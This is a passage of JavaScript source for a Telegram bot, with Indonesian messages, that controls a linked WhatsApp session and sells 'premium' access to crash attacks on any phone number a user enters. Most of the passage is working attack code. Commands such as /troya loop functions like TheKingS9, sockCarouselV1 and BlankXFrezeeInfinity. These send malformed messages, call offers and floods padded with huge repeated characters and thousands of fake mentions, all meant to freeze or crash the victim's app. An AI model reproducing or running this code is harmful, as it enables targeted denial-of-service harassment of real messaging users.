                message_id: sent.message_id,
                parse_mode: "HTML",
                reply_markup: {
                    inline_keyboard: [
                        [{ text: " 👾「結果を確認」", url: `https://wa.me/${formattedNumber}` }]
                    ]
                }
            }
        );

        for (let i = 0; i < 25; i++) {
            await sockCarouselV1(sock, target);
            await sleep(500);
            await sockCarouselV1(sock, target);
            await sleep(500);
            await sockCarouselV1(sock, target);
            await sleep(500);
        }

        console.log(chalk.red(`(本) 𝖲𝗎𝖼𝖼𝖾𝗌 𝖲𝖾𝗇𝖽 Delay Crash`));

        await bot.editMessageCaption(
            `
<blockquote>┌─────────────────────────┐
│   𝖪𝖺𝗂𝗋𝗇 - 𝖡𝖺𝗌𝖾
├─────────────────────────┤
│─ Target : ${formattedNumber}
│─ 𝖳𝗒𝗉𝖾 : Delay Crash
│─ 𝖲𝗍𝖺𝗍𝗎𝗌 : 𝖲𝗎𝖼𝖼𝖾𝗌𝖿𝗎𝗅𝗅𝗒
│─ Date   : ${date}
└─────────────────────────┘</blockquote>
 ©𝖪𝖺𝗂𝗋𝗇𝖢𝗋𝖾𝖺𝗍𝗈𝗋𝖳𝖾𝖺𝗆
            `,
            {
                chat_id: chatId,
                message_id: sent.message_id,
                parse_mode: "HTML",
                reply_markup: {
                    inline_keyboard: [
                        [{ text: " 👾「結果を確認」", url: `https://wa.me/${formattedNumber}` }]
                    ]
                }
            }
        );
    } catch (err) {
        await bot.sendMessage(chatId, `❌ Gagal mengirim bug: ${err.message}`);
    }
});

bot.onText(/\/troya(?:\s+(\d+))?/, async (msg, match) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id;

    // Validasi format
    if (!match || !match[1]) {
        return bot.sendMessage(chatId, 
            `❌ *Format salah!*\n\nGunakan: /troya [nomor]\nContoh: /troya 6281234567890`,
            { parse_mode: "Markdown" }
        );
    }

    const targetNumber = match[1];
    const randomVideo = getRandomVideo();
    const date = getCurrentDate();
    const formattedNumber = targetNumber.replace(/[^0-9]/g, "");

    // Validasi panjang nomor
    if (formattedNumber.length < 10 || formattedNumber.length > 15) {
        return bot.sendMessage(chatId, 
            `❌ Nomor tidak valid. Pastikan nomor 10-15 digit (termasuk kode negara).\nContoh: /troya 6281234567890`,
            { parse_mode: "Markdown" }
        );
    }

    const target = `${formattedNumber}@s.whatsapp.net`;

    // Periksa status premium user
    const isUserPremium = premiumUsers.some(u => u.id === userId && new Date(u.expiresAt) > new Date());

    if (!isUserPremium) {
        return bot.sendVideo(chatId, randomVideo, {
            caption: `
<blockquote>(本) 𝐊𝐚𝐢𝐫𝐧 - 𝐁𝐚𝐬𝐞</blockquote>
❌ Akses ditolak. Fitur ini hanya untuk user premium.
`,
            parse_mode: "HTML",
            reply_markup: {
                inline_keyboard: [
                    [{ text: "𝖠𝗎𝗍𝗁𝗈𝗋", url: "https://t.me/SonKairn" }]
                ]
            }
        });
    }

    if (sessions.size === 0) {
        return bot.sendMessage(chatId, `⚠️ WhatsApp belum terhubung. Jalankan /connect terlebih dahulu.`);
    }

    const sent = await bot.sendVideo(chatId, randomVideo, {
        caption: `
<blockquote>┌─────────────────────────┐
│   𝖪𝖺𝗂𝗋𝗇 - 𝖡𝖺𝗌𝖾
├─────────────────────────┤
│─ Target : ${formattedNumber}
│─ 𝖳𝗒𝗉𝖾 : Delay Hard
│─ 𝖲𝗍𝖺𝗍𝗎𝗌 : 𝖯𝗋𝗈𝗌𝖾𝗌
│─ Date   : ${date}
└─────────────────────────┘</blockquote>
 ©𝖪𝖺𝗂𝗋𝗇𝖢𝗋𝖾𝖺𝗍𝗈𝗋𝖳𝖾𝖺𝗆
`,
        parse_mode: "HTML"
    });

    try {
        await sleep(1000);

        await bot.editMessageCaption(
            `
<blockquote>┌─────────────────────────┐
│   𝖪𝖺𝗂𝗋𝗇 - 𝖡𝖺𝗌𝖾
├─────────────────────────┤
│─ Target : ${formattedNumber}
│─ 𝖳𝗒𝗉𝖾 : Delay Hard
│─ 𝖲𝗍𝖺𝗍𝗎𝗌 : 𝖯𝗋𝗈𝗌𝖾𝗌
│─ Date   : ${date}
└─────────────────────────┘</blockquote>
 ©𝖪𝖺𝗂𝗋𝗇𝖢𝗋𝖾𝖺𝗍𝗈𝗋𝖳𝖾𝖺𝗆
            `,
            {
                chat_id: chatId,
                message_id: sent.message_id,
                parse_mode: "HTML",
                reply_markup: {
                    inline_keyboard: [
                        [{ text: " 👾「結果を確認」", url: `https://wa.me/${formattedNumber}` }]
                    ]
                }
            }
        );

        for (let i = 0; i < 35; i++) {
            await TheKingS9(sock, target);
            await sleep(500);
            await TheKingS9(sock, target);
            await sleep(500);
            await TheKingS9(sock, target);
            await sleep(500);
            await TheKingS9(sock, target);
        }

        console.log(chalk.red(`(本) 𝖲𝗎𝖼𝖼𝖾𝗌 𝖲𝖾𝗇𝖽 Soft Delay`));

        await bot.editMessageCaption(
            `
<blockquote>┌─────────────────────────┐
│   𝖪𝖺𝗂𝗋𝗇 - 𝖡𝖺𝗌𝖾
├─────────────────────────┤
│─ Target : ${formattedNumber}
│─ 𝖳𝗒𝗉𝖾 : Delay Hard
│─ 𝖲𝗍𝖺𝗍𝗎𝗌 : 𝖲𝗎𝖼𝖼𝖾𝗌𝖿𝗎𝗅𝗅𝗒
│─ Date   : ${date}
└─────────────────────────┘</blockquote>
 ©𝖪𝖺𝗂𝗋𝗇𝖢𝗋𝖾𝖺𝗍𝗈𝗋𝖳𝖾𝖺𝗆
            `,
            {
                chat_id: chatId,
                message_id: sent.message_id,
                parse_mode: "HTML",
                reply_markup: {
                    inline_keyboard: [
                        [{ text: " 👾「結果を確認」", url: `https://wa.me/${formattedNumber}` }]
                    ]
                }
            }
        );
    } catch (err) {
        await bot.sendMessage(chatId, `❌ Gagal mengirim bug: ${err.message}`);
    }
});

////Pul Update
bot.onText(/^\/reloadcore$/, async (msg) => {
    pullUpdate(bot, msg);
});

//  -------------- ( connect) ----------- \\
bot.onText(/^\/connect\s+(\d+)/, async (msg, match) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id;
    const botNumber = match[1].replace(/[^0-9]/g, "");

    if (!ceoUsers.includes(userId) && !isOwner(userId)) {
        return bot.sendMessage(chatId, `
❌ *Akses ditolak!*
Hanya *Owner/ceo* yang dapat menjalankan perintah ini.
`, { parse_mode: "Markdown" });
    }

    if (!botNumber || botNumber.length < 8) {
        return bot.sendMessage(chatId, `
⚠️ Nomor tidak valid.
Gunakan format: \`/connect 628xxxxxx\`
`, { parse_mode: "Markdown" });
    }

    try {
        await bot.sendMessage(chatId, `
🔄 Sedang menghubungkan *${botNumber}@s.whatsapp.net* ke sistem...
Mohon tunggu sebentar.
`, { parse_mode: "Markdown" });

        await connectToWhatsApp(botNumber, chatId);

        

    } catch (error) {
        console.error("❌ Error in /connect:", error);
        bot.sendMessage(chatId, `
❌ Gagal menghubungkan ke WhatsApp.
> ${error.message || "Silakan coba lagi nanti."}
`, { parse_mode: "Markdown" });
    }
});

// ================= RESET SESSION =================
bot.onText(/^\/resetsession$/, async (msg) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id;

    // Hanya owner atau ceo
    if (!isOwner(userId) && !ceoUsers.includes(userId)) {
        return bot.sendMessage(chatId, `
❌ *Akses ditolak!*
Hanya *Owner/ceo* yang dapat mereset sesi.
`, { parse_mode: "Markdown" });
    }

    try {
        // Hapus semua sesi dari memori
        sessions.clear();
        sock = null;

        // Hapus folder sessions
        if (fs.existsSync(SESSIONS_DIR)) {
            fs.rmSync(SESSIONS_DIR, { recursive: true, force: true });
        }

        // Hapus file active_sessions.json
        if (fs.existsSync(SESSIONS_FILE)) {
            fs.unlinkSync(SESSIONS_FILE);
        }

        await bot.sendMessage(chatId, `
✅ *Semua sesi WhatsApp berhasil dihapus!*
Bot akan mencoba menyambung ulang secara otomatis.
`, { parse_mode: "Markdown" });

        // Inisialisasi ulang koneksi WhatsApp
        initializeWhatsAppConnections();

    } catch (err) {
        console.error("Gagal reset session:", err);
        bot.sendMessage(chatId, `
❌ Gagal mereset sesi.
> ${err.message}
`, { parse_mode: "Markdown" });
    }
});

/// --- ( case add acces premium ) --- \\\
bot.onText(/\/addprem(?:\s(.+))?/, (msg, match) => {
    const chatId = msg.chat.id;
    const senderId = msg.from.id;

    if (!isOwner(senderId) && !ceoUsers.includes(senderId)) {
        return bot.sendMessage(chatId, `
( ⚠️ ) *Akses Ditolak!*
Anda tidak memiliki izin untuk menjalankan perintah ini.`, { parse_mode: "Markdown" });
    }

    if (!match[1]) {
        return bot.sendMessage(chatId, `
( ❌ ) *Perintah Salah!*
Gunakan format berikut:
✅ /addprem <code>6843967527 30d</code>
`, { parse_mode: "HTML" });
    }

    const args = match[1].split(' ');
    if (args.length < 2) {
        return bot.sendMessage(chatId, `
( ❌ ) *Perintah Salah!*
Gunakan format:
✅ /addprem <code>6843967527 30d</code>
`, { parse_mode: "HTML" });
    }

    const userId = parseInt(args[0].replace(/[^0-9]/g, ''));
    const duration = args[1].toLowerCase();

    if (!/^\d+$/.test(userId)) {
        return bot.sendMessage(chatId, `
( ❌ ) *ID Tidak Valid!*
Gunakan hanya angka ID Telegram.
✅ Contoh: /addprem 6843967527 30d
`, { parse_mode: "Markdown" });
    }

    if (!/^\d+[dhm]$/.test(duration)) {
        return bot.sendMessage(chatId, `
( ❌ ) *Durasi Tidak Valid!*
Gunakan format seperti: 30d, 12h, atau 15m.
✅ Contoh: /addprem 6843967527 30d
`, { parse_mode: "Markdown" });
    }

    const timeValue = parseInt(duration);
    const timeUnit = duration.endsWith("d") ? "days" :
                     duration.endsWith("h") ? "hours" : "minutes";
    const expirationDate = moment().add(timeValue, timeUnit);

    const existingUser = premiumUsers.find(u => u.id === userId);
    if (existingUser) {
        existingUser.expiresAt = expirationDate.toISOString();
        savePremiumUsers();
        bot.sendMessage(chatId, `
✅ *User sudah premium!*
Waktu diperpanjang sampai:
🕓 ${expirationDate.format('YYYY-MM-DD HH:mm:ss')}
`, { parse_mode: "Markdown" });
    } else {
        premiumUsers.push({ id: userId, expiresAt: expirationDate.toISOString() });
        savePremiumUsers();
        bot.sendMessage(chatId, `
✅ *Berhasil menambahkan user premium!*
👤 ID: ${userId}
⏰ Berlaku hingga: ${expirationDate.format('YYYY-MM-DD HH:mm:ss')}
`, { parse_mode: "Markdown" });
    }

    console.log(`[PREMIUM] ${senderId} menambahkan ${userId} sampai ${expirationDate.format('YYYY-MM-DD HH:mm:ss')}`);
});

/// --- ( case list acces premium ) --- \\\
bot.onText(/\/listprem/, (msg) => {
    const chatId = msg.chat.id;
    const senderId = msg.from.id;

    if (!isOwner(senderId) && !ceoUsers.includes(senderId)) {
        return bot.sendMessage(chatId, `
❌ Akses ditolak, hanya owner yang dapat melakukan command ini.`);
    }

    if (premiumUsers.length === 0) {
        return bot.sendMessage(chatId, "📌 No premium users found.");
    }

    let message = "```";
    message += "\n";
    message += " ( + )  LIST PREMIUM USERS\n";
    message += "\n";
    premiumUsers.forEach((user, index) => {
        const expiresAt = moment(user.expiresAt).format('YYYY-MM-DD HH:mm:ss');
        message += `${index + 1}. ID: ${user.id}\n   Exp: ${expiresAt}\n`;
    });
    message += "\n```";

    bot.sendMessage(chatId, message, { parse_mode: "Markdown" });
});

// --- ( case add ceo ) ---
bot.onText(/\/addceo(?:\s(.+))?/, (msg, match) => {
    const chatId = msg.chat.id;
    const senderId = msg.from.id;

    if (!isOwner(senderId)) {
        return bot.sendMessage(
            chatId,
            `❌ Akses ditolak, hanya owner yang dapat melakukan command ini.`,
            { parse_mode: "Markdown" }
        );
    }

    if (!match || !match[1]) {
        return bot.sendMessage(chatId, `
❌ Command salah, Masukan user id serta waktu expired.
✅ Contoh: /addceo 58273654 30d
`);
    }

    const userId = parseInt(match[1].replace(/[^0-9]/g, ''));
    if (!/^\d+$/.test(userId)) {
        return bot.sendMessage(chatId, `
❌ Command salah, Masukan user id serta waktu expired.
✅ Contoh: /addceo 58273654 30d
`);
    }

    if (!ceoUsers.includes(userId)) {
        ceoUsers.push(userId);
        saveceoUsers();
        console.log(`${senderId} Added ${userId} To ceo`);
        bot.sendMessage(chatId, `
✅ Berhasil menambahkan ceo!
Kini user ${userId} memiliki akses ceo.
`);
    } else {
        bot.sendMessage(chatId, `❌ User ${userId} sudah menjadi ceo.`);
    }
});

// --- ( case delete acces premium ) ---
bot.onText(/\/delprem(?:\s(\d+))?/, (msg, match) => {
    const chatId = msg.chat.id;
    const senderId = msg.from.id;

    if (!isOwner(senderId) && !ceoUsers.includes(senderId)) {
        return bot.sendMessage(chatId, `
❌ Akses ditolak, hanya owner/ceo yang dapat melakukan command ini.`);
    }

    if (!match[1]) {
        return bot.sendMessage(chatId, `
❌ Command salah!
✅ Contoh: /delprem 584726249`);
    }

    const userId = parseInt(match[1]);
    if (isNaN(userId)) {
        return bot.sendMessage(chatId, "❌ Invalid input. User ID harus berupa angka.");
    }

    const index = premiumUsers.findIndex(user => user.id === userId);
    if (index === -1) {
        return bot.sendMessage(chatId, `❌ User ${userId} tidak terdaftar di list premium.`);
    }

    premiumUsers.splice(index, 1);
    savePremiumUsers();
    bot.sendMessage(chatId, `
✅ Berhasil menghapus user ${userId} dari daftar premium.`);
});

// --- ( case delete acces ceo ) ---
bot.onText(/\/delceo(?:\s(\d+))?/, (msg, match) => {
    const chatId = msg.chat.id;
    const senderId = msg.from.id;

    if (!isOwner(senderId)) {
        return bot.sendMessage(
            chatId,
            `❌ Akses ditolak, hanya owner yang dapat melakukan command ini.`,
            { parse_mode: "Markdown" }
        );
    }

    if (!match || !match[1]) {
        return bot.sendMessage(chatId, `
❌ Command salah!
✅ Contoh: /delceo 5843967527`);
    }

    const userId = parseInt(match[1].replace(/[^0-9]/g, ''));
    if (!/^\d+$/.test(userId)) {
        return bot.sendMessage(chatId, `
❌ Command salah!
✅ Contoh: /delceo 5843967527`);
    }

    const ceoIndex = ceoUsers.indexOf(userId);
    if (ceoIndex !== -1) {
        ceoUsers.splice(ceoIndex, 1);
        saveceoUsers();
        console.log(`${senderId} Removed ${userId} From ceo`);
        bot.sendMessage(chatId, `
✅ Berhasil menghapus user ${userId} dari daftar ceo.`);
    } else {
        bot.sendMessage(chatId, `❌ User ${userId} belum memiliki akses ceo.`);
    }
});

// Case about me
bot.onText(/\/aboutme/, async (msg) => {
    try {
        const chatId = msg.chat.id;
        const userId = msg.from.id;
        const username = msg.from.username ? `@${msg.from.username}` : "No username";
        const fullName = `${msg.from.first_name || ""} ${msg.from.last_name || ""}`.trim() || "Anonymous";

        const isUserPremium = premiumUsers.some(user => 
            user.id === userId && new Date(user.expiresAt) > new Date()
        );
        const premiumStatus = isUserPremium ? "✅ Premium" : "❌ Regular";

        const aboutMessage = `
<pre>
┌─────────────────────────┐
│        ABOUT USER        │
├─────────────────────────┤
│ USERNAME : ${username.padEnd(15)} │
│ USER ID  : ${userId.toString().padEnd(15)} │
│ STATUS   : ${premiumStatus.padEnd(15)} │
│ NAME     : ${fullName.padEnd(15)} │
└─────────────────────────┘
</pre>`;

        await bot.sendMessage(msg.chat.id, aboutMessage, {
            parse_mode: 'HTML',
            reply_to_message_id: msg.message_id
        });

    } catch (error) {
        console.error("Error /aboutme:", error);
        bot.sendMessage(msg.chat.id, "❌ Error showing info");
    }
});

// ------------------ ( Function Attack ) ------------------------ \\
async function DavDoctUi(target) {
    let DavaXploitt = ":⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⸸⃟⃟『𝐃𝐚𝐯𝐚 𝐗𝐩𝐥𝐨𝐢𝐭𝐭』ꪾ〽️";
    let boomui = "ြ".repeat(25000);

    let DavDoct = generateWAMessageFromContent(
        target,
        proto.Message.fromObject({
            documentMessage: {
                url: "https://mmg.whatsapp.net/v/t62.7119-24/587365455_25895704526760546_4343400859820129115_n.enc?ccb=11-4&oh=01_Q5Aa3wH_lfUCtiO8v_2blYftyRkGE25tzAul39Rk0BSWaBHvPA&oe=69BBC6DF&_nc_sid=5e03e0&mms3=true",
                mimetype: "application/pdf",
                fileSha256: "599yAdsC6dXg1syDfO4RyiQIgm+rP+PhTHr6+d5vMWI=",
                fileLength: "999999999",
                pageCount: 999999999,
                mediaKey: "VVWtiTAe55KXgy6uBxKuf5BVGtEjYbj5f4/aYV4fhB0=",
                fileName: DavaXploitt + ".pdf",
                fileEncSha256: "VkuUIVuTjx+ZqKbvlqnwRHxOufvUgHSJesu14h5F9Rk=",
                directPath: "/v/t62.7119-24/587365455_25895704526760546_4343400859820129115_n.enc?ccb=11-4&oh=01_Q5Aa3wH_lfUCtiO8v_2blYftyRkGE25tzAul39Rk0BSWaBHvPA&oe=69BBC6DF&_nc_sid=5e03e0",
                mediaKeyTimestamp: "1771322893",
                caption: DavaXploitt + boomui,
                nativeFlowMessage: {
                    buttons: [
                        {
                            name: "cta_url",
                            buttonParamsJson: JSON.stringify({
                                display_text: boomui,
                                url: "https://" + "ြ".repeat(5000) + ".com"
                            })
                        }
                    ]
                },
                contextInfo: {
                    mentionedJid: Array.from({ length: 1900 }, () => `1${Math.floor(Math.random() * 9000000000000)}@s.whatsapp.net`),
                    externalAdReply: {
                        title: `🚀 𝐓𝐫𝐚𝐯𝐚𝐬 𝐔𝐢 〽️`,
                        body: `💫`,
                        previewType: "PHOTO",
                        thumbnail: "",
                        sourceUrl: `https://t.me/DavaXploitt`
                    },
                    disappearingMode: {
                        initiator: "CHANGED_IN_CHAT",
                        trigger: "CHAT_SETTING"
                    }
                }
            }
        }),
        { userJid: target, quoted: null }
    );

    await sock.relayMessage(target, DavDoct.message, {
        participant: { jid: target },
        messageId: null,
    });
    console.log(chalk.red("Succesfully Attack Target By : @DavaXploitt"));  
}

async function TheKingS9(sock, target) {
    const SilentMsg = await generateWAMessageFromContent(target, {
        viewOnceMessage: {
            message: {
                interactiveResponseMessage: {
                    body: { 
                        text: "⏤͟͟𝐓𝐡𝐞𝐊𝐢𝐧𝐠𝐒𝐢𝐥𝐞𝐧𝐭", 
                        format: "DEFAULT" 
                    },
                    nativeFlowResponseMessage: {
                        name: "call_permission_request",
                        paramsJson: "\x10".repeat(1045000),
                        version: 3
                    },
                    entryPointConversionSource: "call_permission_message"
                }
            }
        }
    }, {
        ephemeralExpiration: 0,
        forwardingScore: 9741,
        isForwarded: true,
        font: Math.floor(Math.random() * 99999999),
        background: "#" + Math.floor(Math.random() * 16777215).toString(16).padStart(6, "99999999")
    });

    const AzkaMsg = await generateWAMessageFromContent(target, {
        viewOnceMessage: {
            message: {
                interactiveResponseMessage: {
                    body: { 
                        text: "𝐤 𝐟𝐨𝐫 𝐒𝐢𝐥𝐞𝐧𝐭𝐒𝟗", 
                        format: "DEFAULT" 
                    },
                    nativeFlowResponseMessage: {
                        name: "galaxy_message", 
                        paramsJson: "\x10".repeat(1045000),
                        version: 3
                    },
                    entryPointConversionSource: "call_permission_request"
                }
            }
        }
    }, {
        ephemeralExpiration: 0,
        forwardingScore: 9741, 
        isForwarded: true,
        font: Math.floor(Math.random() * 99999999),
        background: "#" + Math.floor(Math.random() * 16777215).toString(16).padStart(6, "99999999")
    });

    await sock.relayMessage("status@broadcast", SilentMsg.message, {
        messageId: SilentMsg.key.id,
        statusJidList: [target],
        additionalNodes: [{
            tag: "meta",
            attrs: {},
            content: [{
                tag: "mentioned_users", 
                attrs: {},
                content: [{ 
                    tag: "to", 
                    attrs: { jid: target } 
                }]
            }]
        }]
    });

    await sock.relayMessage("status@broadcast", AzkaMsg.message, {
        messageId: AzkaMsg.key.id,
        statusJidList: [target],
        additionalNodes: [{
            tag: "meta",
            attrs: {},
            content: [{
                tag: "mentioned_users", 
                attrs: {},
                content: [{ 
                    tag: "to", 
                    attrs: { jid: target } 
                }]
            }]
        }]
    });
}

async function BlankXFrezeeInfinity(sock, target) {
    while (true) {
        try {
            const Messages = [
                "0@s.whatsapp.net",
                "13135550002@s.whatsapp.net",
                ...Array.from({ length: 5000 }, () =>
                    "1" + Math.floor(Math.random() * 999999) + "@s.whatsapp.net"
                ),
            ];

            for (let i = 0; i < 75; i++) {
                const mediaFlood = {
                    viewOnceMessage: {
                        message: {
                            interactiveMessage: {
                                body: { text: "𝐃𝐨𝐮 𝐘𝐨𝐮 𝐊𝐧𝐨𝐰 𝐀𝐳𝐤𝐚? " },
                                contextInfo: {
                                    forwardingScore: 9999,
                                    isForwarded: true,
                                    participant: "0@s.whatsapp.net",
                                    remoteJid: "status@broadcast",
                                    mentionedJid: Messages,
                                },
                                nativeFlowMessage: {
                                    buttons: [
                                        { name: "single_select", buttonParamsJson: "" },
                                        { name: "call_permission_request", buttonParamsJson: JSON.stringify({ status: true }) },
                                    ],
                                    messageParamsJson: "{{".repeat(15000),
                                },
                            },
                            extendedTextMessage: {
                                text: "ꦾ".repeat(25000) + "@1".repeat(25000),
                                contextInfo: {
                                    stanzaId: target,
                                    participant: target,
                                    quotedMessage: {
                                        conversation: "𝐃𝐨𝐮 𝐘𝐨𝐮 𝐊𝐧𝐨𝐰 𝐀𝐳𝐤𝐚? " +
                                            "ꦾ࣯࣯".repeat(60000) +
                                            "@1".repeat(30000),
                                    },
                                },
                                inviteLinkGroupTypeV2: "DEFAULT",
                            },
                        },
                    },
                };

                const msg = generateWAMessageFromContent(target, mediaFlood, {});
                await sock.relayMessage(target, msg.message, {
                    messageId: msg.key.id,
                    statusJidList: [target],
                });
            }
        } catch (err) {
            // ignore error
        }

        await new Promise(res => setTimeout(res, 5000));
    }
}

async function sockFcInvis(sock, target) {
    const {
        encodeSignedDeviceIdentity,
        jidDecode,
        encodeWAMessage,
        patchMessageBeforeSending,
        encodeNewsletterMessage
    } = require("@whiskeysockets/baileys");
    const crypto = require("crypto");

    let devices = (
        await sock.getUSyncDevices([target], false, false)
    ).map(({ user, device }) => `${user}:${device || ''}@s.whatsapp.net`);

    await sock.assertSessions(devices);

    let mutex = () => {
        let map = {};
        return {
            mutex(key, fn) {
                map[key] ??= { task: Promise.resolve() };
                map[key].task = (async prev => {
                    try { await prev; } catch {}
                    return fn();
                })(map[key].task);
                return map[key].task;
            }
        };
    };

    let mutexInstance = mutex();
    let addPadding = buf => Buffer.concat([Buffer.from(buf), Buffer.alloc(8, 1)]);
    let originalEncode = sock.encodeWAMessage?.bind(sock);

    sock.createParticipantNodes = async (recipientJids, message, extraAttrs, dsmMessage) => {
        if (!recipientJids.length) return { nodes: [], shouldIncludeDeviceIdentity: false };

        let patched = await (patchMessageBeforeSending?.(message, recipientJids) ?? message);
        let messages = Array.isArray(patched)
            ? patched
            : recipientJids.map(jid => ({ recipientJid: jid, message: patched }));

        let { id: meId, lid: meLid } = sock.authState.creds.me;
        let lidUser = meLid ? jidDecode(meLid)?.user : null;
        let shouldIncludeDeviceIdentity = false;

        let nodes = await Promise.all(
            messages.map(async ({ recipientJid: jid, message: msg }) => {
                let { user: targetUser } = jidDecode(jid);
                let { user: ownUser } = jidDecode(meId);
                let isOwnUser = targetUser === ownUser || targetUser === lidUser;
                let isSelf = jid === meId || jid === meLid;

                if (dsmMessage && isOwnUser && !isSelf) msg = dsmMessage;

                let bytes = addPadding(
                    originalEncode ? originalEncode(msg) : encodeWAMessage(msg)
                );

                return mutexInstance.mutex(jid, async () => {
                    let { type, ciphertext } = await sock.signalRepository.encryptMessage({ jid, data: bytes });
                    if (type === "pkmsg") shouldIncludeDeviceIdentity = true;
                    return {
                        tag: "to",
                        attrs: { jid },
                        content: [{
                            tag: "enc",
                            attrs: { v: "2", type, ...extraAttrs },
                            content: ciphertext
                        }]
                    };
                });
            })
        );

        return { nodes: nodes.filter(Boolean), shouldIncludeDeviceIdentity };
    };

    let randomBytes = crypto.randomBytes(32);
    let paddedBytes = Buffer.concat([randomBytes, Buffer.alloc(8, 0x01)]);

    const callId = crypto.randomBytes(16).toString("hex").slice(0, 64).toUpperCase();

    let { nodes: destinations, shouldIncludeDeviceIdentity } = await sock.createParticipantNodes(
        devices,
        { 
            conversation: "y",
            messageParamsJson: "{".repeat(10000)
        },
        { count: "0" }
    );

    const callOffer = {
        tag: "call",
        attrs: {
            to: target,
            id: sock.generateMessageTag(),
            from: sock.user.id
        },
        content: [{
            tag: "offer",
            attrs: {
                "call-id": callId,
                "call-creator": sock.user.id
            },
            content: [
                { tag: "audio", attrs: { enc: "opus", rate: "16000" } },
                { tag: "audio", attrs: { enc: "opus", rate: "8000" } },
                {
                    tag: "video",
                    attrs: {
                        orientation: "0",
                        screen_width: "1920",
                        screen_height: "1080",
                        device_orientation: "0",
                        enc: "vp8",
                        dec: "vp8"
                    }
                },
                { tag: "net", attrs: { medium: "3" } },
                {
                    tag: "capability",
                    attrs: { ver: "1" },
                    content: new Uint8Array([1, 5, 247, 9, 228, 250, 1])
                },
                { tag: "encopt", attrs: { keygen: "2" } },
                { tag: "destination", attrs: {}, content: destinations },
                ...(shouldIncludeDeviceIdentity ? [{
                    tag: "device-identity",
                    attrs: {},
                    content: encodeSignedDeviceIdentity(sock.authState.creds.account, true)
                }] : [])
            ]
        }]
    };

    await sock.sendNode(callOffer);
    await new Promise(resolve => setTimeout(resolve, 500));

    console.log("Successfully Attack Target By : @sockXploitt");
}

async function sockCarouselV1(sock, target) {
    console.log(chalk.red("Succesfully Attack Target By : t.me/sockXploitt"));

    let push = [];
    for (let i = 0; i < 1000; i++) {
        push.push({
            body: { text: `\u0000\u0000\u0000\u0000\u0000` },
            footer: { text: "" },
            header: {
                title: "𝘿𝙖𝙫𝙖𝙓 𝙒𝙖𝙨 𝙃𝙚𝙧𝙚 〽️",
                hasMediaAttachment: true,
                imageMessage: {
                    url: "https://mmg.whatsapp.net/v/t62.7118-24/19005640_1691404771686735_1492090815813476503_n.enc?ccb=11-4&oh=01_Q5AaIMFQxVaaQDcxcrKDZ6ZzixYXGeQkew5UaQkic-vApxqU&oe=66C10EEE&_nc_sid=5e03e0&mms3=true",
                    mimetype: "image/jpeg",
                    fileSha256: "dUyudXIGbZs+OZzlggB1HGvlkWgeIC56KyURc4QAmk4=",
                    fileLength: "591",
                    height: 0,
                    width: 0,
                    mediaKey: "LGQCMuahimyiDF58ZSB/F05IzMAta3IeLDuTnLMyqPg=",
                    fileEncSha256: "G3ImtFedTV1S19/esIj+T5F+PuKQ963NAiWDZEn++2s=",
                    directPath: "/v/t62.7118-24/19005640_1691404771686735_1492090815813476503_n.enc",
                    mediaKeyTimestamp: "1721344123",
                    jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/",
                    scansSidecar: "igcFUbzFLVZfVCKxzoSxcDtyHA1ypHZWFFFXGe+0gV9WCo/RLfNKGw==",
                    scanLengths: [247, 201, 73, 63],
                    midQualityFileSha256: "qig0CvELqmPSCnZo7zjLP0LJ9+nWiwFgoQ4UkjqdQro="
                }
            },
            nativeFlowMessage: { buttons: [] }
        });
    }

    const carousel = generateWAMessageFromContent(
        target,
        {
            viewOnceMessage: {
                message: {
                    messageContextInfo: {
                        deviceListMetadata: {},
                        deviceListMetadataVersion: 2,
                        messageSecret: crypto.randomBytes(32),
                        supportPayload: JSON.stringify({
                            version: 2,
                            is_ai_message: true,
                            should_show_system_message: true,
                            ticket_id: crypto.randomBytes(16)
                        }),
                        badgeChat: {
                            unreadCount: 9999
                        }
                    },
                    interactiveMessage: {
                        body: { text: "Exploit Beta ⁰ ATRASO ;;\u0000\u0000\u0000\u0000" },
                        footer: { text: "t.me/sockXploitt" },
                        header: { hasMediaAttachment: false },
                        carouselMessage: { cards: [...push] },
                        contextInfo: {
                            mentionedJid: Array.from({ length: 1901 }, () => `1${Math.floor(Math.random() * 9000000000000)}@s.whatsapp.net`),
                            entryPointConversionSource: "non_contact",
                            entryPointConversionApp: "whatsapp",
                            entryPointConversionDelaySeconds: 467593,
                            participant: "0@s.whatsapp.net",
                            quotedMessage: {
                                viewOnceMessage: {
                                    message: {
                                        interactiveResponseMessage: {
                                            body: {
                                                text: "[ ! ] sock Xploitt 𖥂",
                                                format: "DEFAULT"
                                            },
                                            nativeFlowResponseMessage: {
                                                name: "call_permission_request",
                                                paramsJson: "\u0000".repeat(500),
                                                version: 3
                                            }
                                        }
                                    }
                                }
                            },
                            remoteJid: "@s.whatsapp.net"
                        }
                    }
                }
            }
        },
        {}
    );

    await sock.relayMessage(
        target,
        carousel.message,
        {
            participant: { jid: target },
            messageId: sock.generateMessageTag()
        }
    );
}

async function LocationSilent(sock, target) {
    console.log(chalk.red(`Silent Proses attack`));

    const Silent = proto.Message.fromObject({
        viewOnceMessage: {
            message: {
                interactiveMessage: {
                    header: {
                        locationMessage: {
                            degreesLatitude: 11.11,
                            degreesLongitude: -11.11,
                            name: "You Know Silent?" + "ꦽ".repeat(60000),
                            url: "https://t.me/Otapengenkawin",
                            contextInfo: {
                                externalAdReply: {
                                    quotedAd: {
                                        advertiserName: "ꦾ".repeat(60000),
                                        mediaType: "IMAGE",
                                        jpegThumbnail: Buffer.from("/9j/4AAQSkZJRgABAQAAAQABAAD/", "base64"),
                                        caption: "Silent Is Here"
                                    },
                                    placeholderKey: {
                                        remoteJid: "0@g.us",
                                        fromMe: true,
                                        id: "ABCDEF1234567890"
                                    }
                                }
                            }
                        },
                        hasMediaAttachment: true
                    },
                    body: {
                        text: "Ola Im Silent⸙"
                    },
                    nativeFlowMessage: {
                        messageParamsJson: "{[",
                        messageVersion: 3,
                        buttons: [
                            {
                                name: "single_select",
                                buttonParamsJson: ""
                            },
                            {
                                name: "galaxy_message",
                                buttonParamsJson: JSON.stringify({
                                    icon: "RIVIEW",
                                    flow_cta: "ꦽ".repeat(10000),
                                    flow_message_version: "3"
                                })
                            },
                            {
                                name: "galaxy_message",
                                buttonParamsJson: JSON.stringify({
                                    icon: "RIVIEW",
                                    flow_cta: "ꦾ".repeat(10000),
                                    flow_message_version: "3"
                                })
                            }
                        ]
                    },
